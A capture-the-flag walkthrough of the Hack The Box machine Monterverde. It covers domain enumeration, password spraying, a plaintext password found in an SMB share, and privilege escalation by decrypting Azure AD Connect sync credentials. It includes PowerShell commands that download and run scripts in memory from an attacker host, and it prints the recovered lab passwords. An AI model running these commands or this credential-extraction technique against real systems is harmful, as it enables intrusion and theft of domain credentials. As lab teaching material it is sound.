---
tags:
  - AzureConnect
  - azure
  - adsync
---

# HTB: Monterverde

***Overview**: Monterverde is a Medium rated HTB machine that uses credential exposure in an XML file located on a share to gain foothold on the target. then it exploits Password Hash Synchronization feature on Azure AD Connect to decrypt credentials stored in the Database in order to retrieve domain Admin credentials.*
## Scanning and Enumeration

- so we will run a port scan to identify open ports on our target

```shell
   ┌──(kali㉿kali)-[~/HTB/Monterverde]
└─$ sudo masscan -p1-65535 10.10.10.172 --rate=1000 -e tun0 > ports
[sudo] password for kali: 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2023-11-14 08:02:37 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
                                                                                                                                                                       
┌──(kali㉿kali)-[~/HTB/Monterverde]
└─$ cat ports
Discovered open port 53/tcp on 10.10.10.172                                    
Discovered open port 135/tcp on 10.10.10.172                                   
Discovered open port 593/tcp on 10.10.10.172                                   
Discovered open port 49673/tcp on 10.10.10.172                                 
Discovered open port 389/tcp on 10.10.10.172                                   
Discovered open port 636/tcp on 10.10.10.172                                   
Discovered open port 5985/tcp on 10.10.10.172                                  
Discovered open port 464/tcp on 10.10.10.172                                   
Discovered open port 49674/tcp on 10.10.10.172                                 
Discovered open port 445/tcp on 10.10.10.172                                   
Discovered open port 139/tcp on 10.10.10.172                                   
Discovered open port 9389/tcp on 10.10.10.172                                  
Discovered open port 49697/tcp on 10.10.10.172                                 
Discovered open port 65149/tcp on 10.10.10.172                                 
Discovered open port 88/tcp on 10.10.10.172                                    
Discovered open port 49676/tcp on 10.10.10.172                                 
Discovered open port 49667/tcp on 10.10.10.172                                                                                
┌──(kali㉿kali)-[~/HTB/Monterverde]
└─$ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

```

- then we can run a service scan on the open ports that we have identified

```shell
┌──(kali㉿kali)-[~/HTB/Monterverde]
└─$ nmap -sV -sC -p$ports -oA nmap/monterverde_ports 10.10.10.172 -v -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-14 03:06 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 03:06
Completed NSE at 03:06, 0.00s elapsed
Initiating NSE at 03:06
Completed NSE at 03:06, 0.00s elapsed
Initiating NSE at 03:06
Completed NSE at 03:06, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 03:06
Completed Parallel DNS resolution of 1 host. at 03:06, 0.07s elapsed
Initiating Connect Scan at 03:06
Scanning 10.10.10.172 [17 ports]
Discovered open port 135/tcp on 10.10.10.172
Discovered open port 139/tcp on 10.10.10.172
Discovered open port 445/tcp on 10.10.10.172
Discovered open port 49667/tcp on 10.10.10.172
Discovered open port 9389/tcp on 10.10.10.172
Discovered open port 53/tcp on 10.10.10.172
Discovered open port 5985/tcp on 10.10.10.172
Discovered open port 49697/tcp on 10.10.10.172
Discovered open port 464/tcp on 10.10.10.172
Discovered open port 49676/tcp on 10.10.10.172
Discovered open port 636/tcp on 10.10.10.172
Discovered open port 88/tcp on 10.10.10.172
Discovered open port 389/tcp on 10.10.10.172
Discovered open port 65149/tcp on 10.10.10.172
Discovered open port 49673/tcp on 10.10.10.172
Discovered open port 593/tcp on 10.10.10.172
Discovered open port 49674/tcp on 10.10.10.172
Completed Connect Scan at 03:06, 0.34s elapsed (17 total ports)
Initiating Service scan at 03:06
Scanning 17 services on 10.10.10.172
Completed Service scan at 03:07, 56.34s elapsed (17 services on 1 host)
NSE: Script scanning 10.10.10.172.
Initiating NSE at 03:07
Completed NSE at 03:07, 40.16s elapsed
Initiating NSE at 03:07
Completed NSE at 03:07, 2.39s elapsed
Initiating NSE at 03:07
Completed NSE at 03:07, 0.01s elapsed
Nmap scan report for 10.10.10.172
Host is up (0.16s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-14 08:06:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
65149/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-11-14T08:07:21
|_  start_date: N/A


```

- from the presence of Kerberos, DNS, LDAP and SMB we can tell that it is a Domain controller

### RPC

- Let's enumerate some users using the rpcclient
- and we have identified some users

```
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

![](assets/Monterverde_assets/Pasted%20image%2020231114083124.png)
- we can also query some of the users using rpcclient

```shell
rpcclient $> queryuser mhope
        User Name   :   mhope
        Full Name   :   Mike Hope
        Home Drive  :   \\monteverde\users$\mhope
        Dir Drive   :   H:
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Fri, 03 Jan 2020 08:29:59 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Thu, 02 Jan 2020 18:40:06 EST
        Password can change Time :      Fri, 03 Jan 2020 18:40:06 EST
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x641
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000002
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $> queryuser dgalanos
        User Name   :   dgalanos
        Full Name   :   Dimitris Galanos
        Home Drive  :   \\monteverde\users$\dgalanos
        Dir Drive   :   H:
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 31 Dec 1969 19:00:00 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Fri, 03 Jan 2020 08:06:11 EST
        Password can change Time :      Sat, 04 Jan 2020 08:06:11 EST
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0xa35
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $> queryuser dgalanos
        User Name   :   dgalanos
        Full Name   :   Dimitris Galanos
        Home Drive  :   \\monteverde\users$\dgalanos
        Dir Drive   :   H:
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 31 Dec 1969 19:00:00 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Fri, 03 Jan 2020 08:06:11 EST
        Password can change Time :      Sat, 04 Jan 2020 08:06:11 EST
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0xa35
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $> queryuser roleary
        User Name   :   roleary
        Full Name   :   Ray O'Leary
        Home Drive  :   \\monteverde\users$\roleary
        Dir Drive   :   H:
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 31 Dec 1969 19:00:00 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Fri, 03 Jan 2020 08:08:06 EST
        Password can change Time :      Sat, 04 Jan 2020 08:08:06 EST
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0xa36
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $> queryuser svc-ata
        User Name   :   svc-ata
        Full Name   :   svc-ata
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 31 Dec 1969 19:00:00 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Fri, 03 Jan 2020 07:58:31 EST
        Password can change Time :      Sat, 04 Jan 2020 07:58:31 EST
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0xa2b
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $> queryuser svc-bexec
        User Name   :   svc-bexec
        Full Name   :   svc-bexec
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 31 Dec 1969 19:00:00 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Fri, 03 Jan 2020 07:59:56 EST
        Password can change Time :      Sat, 04 Jan 2020 07:59:56 EST
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0xa2c
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $> queryuser svc-netapp
        User Name   :   svc-netapp
        Full Name   :   svc-netapp
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 31 Dec 1969 19:00:00 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Fri, 03 Jan 2020 08:01:43 EST
        Password can change Time :      Sat, 04 Jan 2020 08:01:43 EST
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0xa2d
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...

```

- we'll notice from there that the user mhope is the user with a logon count that's not 0
- we can also enumerate the groups in the domain

```shell
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]
```

- we can enumerate the domains itself and as we can see, we already know we are in the MEGABANK domain

![](assets/Monterverde_assets/Pasted%20image%2020231114084522.png)

### LDAP

- we can enumerate the all the objects in the domain and place them in a file, and then grep information that we want like the groups in the domain and the users in the domain

```shell
┌──(kali㉿kali)-[~/HTB/Monterverde]
└─$ ldapsearch -x -b "dc=MEGABANK,dc=local" -H ldap://10.10.10.172 > ldap-anonymous.out
                                                                                                                                                                       
┌──(kali㉿kali)-[~/HTB/Monterverde]
└─$ cat ldap-anonymous.out| grep -i memberof
memberOf: CN=Guests,CN=Builtin,DC=MEGABANK,DC=LOCAL
memberOf: CN=Users,CN=Builtin,DC=MEGABANK,DC=LOCAL
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=MEGABANK,DC=LOCA
memberOf: CN=Users,CN=Builtin,DC=MEGABANK,DC=LOCAL
memberOf: CN=IIS_IUSRS,CN=Builtin,DC=MEGABANK,DC=LOCAL
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=MEGABANK,DC=LO
memberOf: CN=Users,CN=Builtin,DC=MEGABANK,DC=LOCAL
memberOf: CN=Guests,CN=Builtin,DC=MEGABANK,DC=LOCAL
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=MEGABANK,DC=LO
memberOf: CN=Windows Authorization Access Group,CN=Builtin,DC=MEGABANK,DC=LOCA
memberOf: CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
memberOf: CN=Users,CN=Builtin,DC=MEGABANK,DC=LOCAL
memberOf: CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
memberOf: CN=Remote Management Users,CN=Builtin,DC=MEGABANK,DC=LOCAL
memberOf: CN=Trading,OU=Groups,DC=MEGABANK,DC=LOCAL
memberOf: CN=HelpDesk,OU=Groups,DC=MEGABANK,DC=LOCAL
memberOf: CN=Operations,OU=Groups,DC=MEGABANK,DC=LOCAL
                                                                                                                                                                       
┌──(kali㉿kali)-[~/HTB/Monterverde]
└─$ cat ldap-anonymous.out| grep -i givenName
givenName: Mike
givenName: SABatchJobs
givenName: svc-ata
givenName: svc-bexec
givenName: svc-netapp
givenName: Dimitris
givenName: Ray
givenName: Sally

```

- we can just get all the users and groups using the command

```shell
ldapsearch -x -h 10.10.10.172 -p 389 -b ​"dc=MEGABANK,dc=local"​ -s sub
"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.
4.803:=2)))"​ samaccountname | grep sAMAccountName
```

```shell
┌──(kali㉿kali)-[~/HTB/Monterverde]
└─$ ldapsearch -x -b "dc=MEGABANK,dc=local" -H ldap://10.10.10.172 -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))" samaccountname | grep sAMAccountName      
sAMAccountName: Guest
sAMAccountName: Users
sAMAccountName: Guests
sAMAccountName: Remote Desktop Users
sAMAccountName: Network Configuration Operators
sAMAccountName: Performance Monitor Users
sAMAccountName: Performance Log Users
sAMAccountName: Distributed COM Users
sAMAccountName: IIS_IUSRS
sAMAccountName: Cryptographic Operators
sAMAccountName: Event Log Readers
sAMAccountName: Certificate Service DCOM Access
sAMAccountName: RDS Remote Access Servers
sAMAccountName: RDS Endpoint Servers
sAMAccountName: RDS Management Servers
sAMAccountName: Hyper-V Administrators
sAMAccountName: Access Control Assistance Operators
sAMAccountName: Remote Management Users
sAMAccountName: Storage Replica Administrators
sAMAccountName: MONTEVERDE$
sAMAccountName: Domain Computers
sAMAccountName: Cert Publishers
sAMAccountName: Domain Users
sAMAccountName: Domain Guests
sAMAccountName: Group Policy Creator Owners
sAMAccountName: RAS and IAS Servers
sAMAccountName: Pre-Windows 2000 Compatible Access
sAMAccountName: Incoming Forest Trust Builders
sAMAccountName: Windows Authorization Access Group
sAMAccountName: Terminal Server License Servers
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountName: Denied RODC Password Replication Group
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountName: Cloneable Domain Controllers
sAMAccountName: Protected Users
sAMAccountName: DnsAdmins
sAMAccountName: DnsUpdateProxy
sAMAccountName: SQLServer2005SQLBrowserUser$MONTEVERDE
sAMAccountName: AAD_987d7f2f57d2
sAMAccountName: ADSyncAdmins
sAMAccountName: ADSyncOperators
sAMAccountName: ADSyncBrowse
sAMAccountName: ADSyncPasswordSet
sAMAccountName: mhope
sAMAccountName: Azure Admins
sAMAccountName: SABatchJobs
sAMAccountName: svc-ata
sAMAccountName: svc-bexec
sAMAccountName: svc-netapp
sAMAccountName: File Server Admins
sAMAccountName: Call Recording Admins
sAMAccountName: Reception
sAMAccountName: Operations
sAMAccountName: Trading
sAMAccountName: HelpDesk
sAMAccountName: Developers
sAMAccountName: dgalanos
sAMAccountName: roleary
sAMAccountName: smorgan

```

- we can also use windapsearch script for this, so i dentified users

```shell
┌──(kali㉿kali)-[/opt/windapsearch]
└─$ python3 windapsearch.py --dc-ip 10.10.10.172 -U
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.172
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=MEGABANK,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users
[+]     Found 10 users: 

cn: Guest

cn: AAD_987d7f2f57d2

cn: Mike Hope
userPrincipalName: mhope@MEGABANK.LOCAL

cn: SABatchJobs
userPrincipalName: SABatchJobs@MEGABANK.LOCAL

cn: svc-ata
userPrincipalName: svc-ata@MEGABANK.LOCAL

cn: svc-bexec
userPrincipalName: svc-bexec@MEGABANK.LOCAL

cn: svc-netapp
userPrincipalName: svc-netapp@MEGABANK.LOCAL

cn: Dimitris Galanos
userPrincipalName: dgalanos@MEGABANK.LOCAL

cn: Ray O'Leary
userPrincipalName: roleary@MEGABANK.LOCAL

cn: Sally Morgan
userPrincipalName: smorgan@MEGABANK.LOCAL


[*] Bye!
```

- so the users we identified

```
Mike Hope
svc-ata
svc-bexec
svc-netapp
Dimitris Galanos
Ray O'Leary
Sally Morgan
```

- so we have verified the users we have on the domain

### Kerberos
- using kerbrute, we can verify that those usernames exist, what 

![](assets/Monterverde_assets/Pasted%20image%2020231114093101.png)

```
svc-ata@MEGABANK.local
svc-bexec@MEGABANK.local
SABatchJobs@MEGABANK.local
smorgan@MEGABANK.local
dgalanos@MEGABANK.local
roleary@MEGABANK.local
mhope@MEGABANK.local
svc-netapp@MEGABANK.local
AAD_987d7f2f57d2@MEGABANK.local

```

- we can attempt to retrieve a TGT using an ASREPROASTING attack but each of the user account have Pre-authentication set, so we can't do so

![](assets/Monterverde_assets/Pasted%20image%2020231114093117.png)

- so why don't we try to get valid account credentials,  so using the valid set of usernames we have, we can try to bruteforce for passwords. A common password mistake is to use the username as the password especially for service accounts.

Resource for testing for credentials: [https://wiki.owasp.org/index.php/Testing_for_default_credentials_(OTG-AUTHN-002)](https://wiki.owasp.org/index.php/Testing_for_default_credentials_(OTG-AUTHN-002))

![](assets/Monterverde_assets/Pasted%20image%2020231114134821.png)

- so using the using the username as the password we we're able to get a valid set of credentials for the SABatchJobs account with crackmapexec

```shell
pipx run crackmapexec smb 10.10.10.172 -d MEGABANK.LOCAL -u userlist.txt -p userlist.txt
```

![](assets/Monterverde_assets/Pasted%20image%2020231114122909.png)

### SMB

- so now that we have a valid set of credentials, we can now enumerate the SMB shares using the credentials

![](assets/Monterverde_assets/Pasted%20image%2020231114123419.png)

- we can check the users share and we can see some of the users that we identified
![](assets/Monterverde_assets/Pasted%20image%2020231114131949.png)

- so looking through each directory for each user, we come across an azure.xml file in the mhope direcotory (remember that the mhope users was the one with actual logon counts)

![](assets/Monterverde_assets/Pasted%20image%2020231114132304.png)

- viewing that xml file in our browser, we discover a password `4n0therD4y@n0th3r$` and since its in the mhope directory, we assume its for the mhope user account

![](assets/Monterverde_assets/Pasted%20image%2020231114132211.png)

- so using crackmapexec on smb and winrm, we can see that we have access using winrm on the DC

![](assets/Monterverde_assets/Pasted%20image%2020231114133404.png)

![](assets/Monterverde_assets/Pasted%20image%2020231114133351.png)

- now we we have foothold on the DC

![](assets/Monterverde_assets/Pasted%20image%2020231114133628.png)

- We can view the user flag

![](assets/Monterverde_assets/Pasted%20image%2020231114133722.png)

## Domain Privilege Escalation

- we can run our PowerUp script, we can see some possible DLL hijack vulnerabilities

```
IEX(New-Object Net.webClient).downloadString('http://10.10.14.20/PowerUp.ps1');Invoke-AllChecks
```


![](assets/Monterverde_assets/Pasted%20image%2020231114135308.png)

- but if we keep looking through, we see that we have an .Azure directory in our mhope home directory

![](assets/Monterverde_assets/Pasted%20image%2020231114141213.png)

![](assets/Monterverde_assets/Pasted%20image%2020231114141154.png)

- we can view the contents of these directory

![](assets/Monterverde_assets/Pasted%20image%2020231114141225.png)

- reading the information at a blog [https://www.cobalt.io/blog/azure-ad-pentesting-fundamentals](https://www.cobalt.io/blog/azure-ad-pentesting-fundamentals). we saw that the file TokenCache.dat keeps the user's session information. and a file accesTokens.json in this file path stores the access token information, and the tokens can still be useful if the user does not log off

![](assets/Monterverde_assets/Pasted%20image%2020231230104227.png)

- but we don't have that access token file in the directory, so we can keep looking through the system
- we can also see that our user mhope is part of the Azure Admins group

```shell
*Evil-WinRM* PS C:\Users\mhope\.Azure> net group "Azure Admins"
Group name     Azure Admins
Comment

Members

-------------------------------------------------------------------------------
AAD_987d7f2f57d2         Administrator            mhope
The command completed successfully.

*Evil-WinRM* PS C:\Users\mhope\.Azure> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 3:40:05 PM
Password expires             Never
Password changeable          1/3/2020 3:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   1/3/2020 5:29:59 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.

```

- we can also see that a service account AAD_987d7f2f57d2 is also an azure admin, this service account is for synchronization

```shell
*Evil-WinRM* PS C:\Users\mhope\.Azure> net user AAD_987d7f2f57d2
User name                    AAD_987d7f2f57d2
Full Name                    AAD_987d7f2f57d2
Comment                      Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 2:53:24 PM
Password expires             Never
Password changeable          1/3/2020 2:53:24 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/14/2023 4:32:12 AM

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.


```

- Now synchronization with what??
- a simple google search for what this means would lead us to Microsoft Entra connect ADSync [Microsoft Entra Connect: ADSync service account - Microsoft Entra ID | Microsoft Learn](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)

![](assets/Monterverde_assets/Pasted%20image%2020231231092148.png)

- so from the above we know that that user account, and it tell us that this account is created on the domain if you install Microsoft Entra connect on the DC

```ad-note
Azure AD Connect v1 i.e Azure AD Sync has been retired and Entra Connect is its successor 
```

- we can verify this in the program files and see that both Azure AD connect and AD Sync are installed on the DC

```shell
*Evil-WinRM* PS C:\Users\mhope\Documents> ls "C:\\Program Files"


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
d-----         1/2/2020   2:38 PM                Microsoft SQL Server
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
d-----         1/2/2020   2:32 PM                Microsoft.NET
d-----         1/3/2020   5:28 AM                PackageManagement
d-----         1/2/2020   9:37 PM                VMware
d-r---         1/2/2020   2:46 PM                Windows Defender
d-----         1/2/2020   2:46 PM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
d-----         1/2/2020   2:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----         1/2/2020   2:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----         1/3/2020   5:28 AM                WindowsPowerShell
```

```ad-hint
look for what programs are running and services on your target and try to find out about them and what they do
```

- so what is Azure AD Connect??

![](assets/Monterverde_assets/Pasted%20image%2020231114164230.png)

```ad-info
Azure AD Connect/Azure AD Sync is just a tool that allows organizations to synchronize their On premise AD with their Azure AD

A little out of scope
- we also have Azure AD Cloud Sync
- Both Azure AD Connect and Azure AD Cloud sync are both tools that sync on premise AD data to Azure AD but the difference is Azure AD Connect runs and stores configurations on the on premise sync server while Azure AD Cloud sync runs and stores configurations in the cloud
```

- we can see that there is an MSSQL database running when we do `netstat -ano`

![](assets/Monterverde_assets/Pasted%20image%2020231114204810.png)

```ad-info
A Little Background on the the Exploit
- Azure AD is a Microsoft cloud based IAM (Identity and Access Management Service) (it is not a DC in the cloud)
- Password Hash Syncronization (PHS) is one of the features used by Azure AD Connect to sync with on prem AD. it is th easiest authentication option.
- another feature is Pass through Authentication (PTA) which allows Azure to foward authentication requests to the on prem AD i.e. it validates credentials directory on the On-prem AD, so no need to upload hashes.
- But our focus for this is PHS
- whenever a password changes on prem, it is synchronized to Azure AD
- azure ad connect is installed on prem and it needs to have access to the password hash it is to synchronize so it has to have a high privilege AD account
- it also has high privileged account in Azure AD, so high privileged accounts in both
- if your Azure AD connect sync account is compromised then your Azure AD is also compromised
- Azure AD Connect stores its Data in 2 places:
	- A database stored in `C:\Program Files\Microsoft Azure AD Sync\Data`
	- the registry
- the credentials are stored in the database
- the database can be accessed as a local DB on the host and browsed locally and there are 2 interesting tables
	- `mms_management_table` and `mms_server_configuration`
- in the` mms_management_agent` table, there is a field (private_configuration_xml) and also another field which is encrypted configuration (encrypted_configuration): We can view these fields using the sqlcmd utility or Visual Studio SQL Server Explorer.
- in the xml in the private_configuration_xml holds information like account name, on prem domain name, but the password isnt there but has the field encrypted="1", which suggests the password is the encrypted data which is also in the table (the encrypted_configuration field)
- all the cryto stuff with the encryted data is done by the mycrypt.dll located at `C:\Program Files\Microsoft Azure AD Sync\Binn\mcrypt.dll`
- So now the tool will have to first stop the service to download the database, then restart it back, then, retrive all the keys necessary for decryption and pass it to that mcrypt.dll to decrypt before we can retrieve the password
```

- Resources with more Detailed explanation:
	- [Azure AD Connect for Red Teamers - XPN InfoSec Blog (xpnsec.com)](https://blog.xpnsec.com/azuread-connect-for-redteam/)
	- [Azure AD Connect Database Exploit (Priv Esc) | VbScrub](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/)
	- [Updating adconnectdump - a journey into DPAPI - dirkjanm.io](https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/)
	- [TR19-Im in your cloud.pdf (dirkjanm.io)](https://dirkjanm.io/assets/raw/TR19-Im%20in%20your%20cloud.pdf)
	- [TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory (youtube.com)](https://www.youtube.com/watch?v=JEIR5oGCwdg)

- So to start the exploitation, we first of all retrieve and run the decryption tool [azuread_decrypt_msol_v2.ps1](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c)
- so we download this
- for the script to work we have to specify the correct connection string in the script first, we got the connection string from [https://www.connectionstrings.com/microsoft-sql-server-odbc-driver/](https://www.connectionstrings.com/microsoft-sql-server-odbc-driver/)

![](assets/Monterverde_assets/Pasted%20image%2020231114203954.png)

```
Server=10.10.10.172;Database=ADSync;Trusted_Connection=Yes;
```

- so Following the guide [https://blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)
- this is the content of the decryption script, and we can see we edited the connection string

![](assets/Monterverde_assets/Pasted%20image%2020231114204053.png)

- so we have to change to the AD Sync Bin folder and run the tool

```shell
cd "C:\Program Files\Microsoft Azure AD Sync\Bin"

IEX(New-Object Net.webClient).downloadString('http://10.10.14.20/azuread_decrypt_msol.ps1')
```

![](assets/Monterverde_assets/Pasted%20image%2020231114203900.png)
there are other tools too like  [https://github.com/dirkjanm/adconnectdump](https://github.com/dirkjanm/adconnectdump)
- then running the command, we get the password hash

```shell
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> IEX(New-Object Net.webClient).downloadString('http://10.10.14.20/azuread_decrypt_msol.ps1')
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

- so checking the validity of the credentials, we can see that we do have the DA credentials

